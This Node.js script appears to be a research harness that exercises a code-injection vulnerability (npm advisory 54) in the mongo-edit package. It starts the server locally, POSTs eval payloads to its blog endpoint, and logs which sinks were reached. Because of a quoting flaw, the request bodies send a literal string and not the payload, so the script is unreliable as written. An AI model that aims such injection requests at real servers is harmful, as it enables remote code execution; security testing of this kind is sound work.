/**
 * Advisory 54: https://nodesecurity.io/advisories/54
 */
var utils = require("iflow");
var attackUtils = require("./AttackUtils.js");
attackUtils.setup();

var path = require("path");
var oldDir = __dirname;
process.chdir("./node_modules/mongo-edit");

var edit = require('mongo-edit');
// var configs = require("./configs.json");
// var policy = require("./Policy.js")(__dirname, edit);

edit.launchServer();
var request = require('request');


setTimeout(function() {
    attackUtils.deliverPayloads(attackUtils.payloadsEval, function (payload) {
        console.log('{"newData":"23;' + payload + '"}')
        request({
                url:'http://localhost:2762/blog/12',
                method: "POST",
                json: true,
                body: {"newData":"23;' + payload + '"}
            }, function(error, response, body) {
                //console.log(body);
            });
    }, function(result, filesWithSinks) {
        var benignInput = "{benignInput:25}"
        request({
            url:'http://localhost:2762/blog/12',
            method: "POST",
            json: true,
            body: {"newData":"' + benignInput + '"}
        }, function(error, response, body) {
            attackUtils.printCallStrings();
            result += " " + attackUtils.observedString(benignInput);
            process.chdir(oldDir);
            console.log(result);
            process.exit(0);
        });

    });
}, 3000);
